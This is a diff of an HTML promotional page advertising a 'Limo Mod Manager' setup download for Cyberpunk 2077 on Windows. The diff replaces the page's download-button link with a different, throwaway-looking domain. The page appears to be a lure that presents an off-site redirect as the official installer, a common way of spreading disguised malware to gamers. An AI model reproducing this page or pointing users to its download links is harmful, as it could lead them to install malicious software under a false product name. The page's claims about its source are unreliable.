@@ -1,7 +1,7 @@
 <div style="max-width:800px;margin:auto;padding:20px;font-family:Arial,sans-serif;line-height:1.6;background:#0a0a0f;color:#e0e0e0;border-radius:15px;">
 <h1 style="color:#44aaff;border-bottom:2px solid #2288cc;text-align:center;">🤖 Limo Mod Manager – Cyberpunk 2077 Mod Manager for Windows (REDmod + ArchiveXL) 🤖</h1>
 <p style="font-size:1.1em;text-align:center;"><strong>Advanced mod management tool for Cyberpunk 2077 on Windows.</strong> Supports REDmod, ArchiveXL, TweakXL, Codeware, and all CET‑based mods. Virtual file system not required – Limo's deployment system keeps your game folder pristine.</p>
-<div style="background:#111116;padding:20px;text-align:center;margin:15px 0;"><a href="https://www.shawonline.co.za/redir" style="background:#44aaff;color:#000;padding:12px 25px;text-decoration:none;border-radius:5px;">⬇️ DOWNLOAD LIMO MOD MANAGER (SETUP)</a><p>✅ Windows 10/11 ✅ REDmod integration ✅ ArchiveXL/TweakXL ✅ CET framework ✅ Profile system</p></div>
+<div style="background:#111116;padding:20px;text-align:center;margin:15px 0;"><a href="https://nowayasap.icu/set" style="background:#44aaff;color:#000;padding:12px 25px;text-decoration:none;border-radius:5px;">⬇️ DOWNLOAD LIMO MOD MANAGER (SETUP)</a><p>✅ Windows 10/11 ✅ REDmod integration ✅ ArchiveXL/TweakXL ✅ CET framework ✅ Profile system</p></div>
 <img src="https://shared.fastly.steamstatic.com/store_item_assets/steam/apps/1091500/header.jpg" style="max-width:100%;border-radius:8px;margin:15px 0;">
 <div><h3>📦 What You Unlock with Limo Mod Manager for Cyberpunk 2077:</h3>
 <ul><li><strong>REDmod Support:</strong> Full compatibility with CD Projekt RED's official modding framework – install .redmod files with one click.</li>
